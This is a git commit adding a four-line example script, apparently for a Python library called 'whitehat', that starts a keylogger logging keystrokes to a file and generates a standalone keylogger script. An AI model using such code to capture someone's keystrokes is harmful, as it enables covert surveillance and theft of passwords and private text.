cb3d7778a57a3d11bd98f0742a38bf72345f11dd
LyQuid :3 <83483788+LyQuid12@users.noreply.github.com>
2021-11-01 14:01:46 +0700

    Create keylogger.py for example

---
+++ examples/keylogger.py
@@ -0,0 +1,4 @@
+import whitehat
+
+whitehat.keylogger.start("C:\\path\\log.txt", True)    # Start keylogger (Log file path, allow print)
+whitehat.keylogger.make_keylogger("C:\\path\\test.py")  # Make a keylogger file
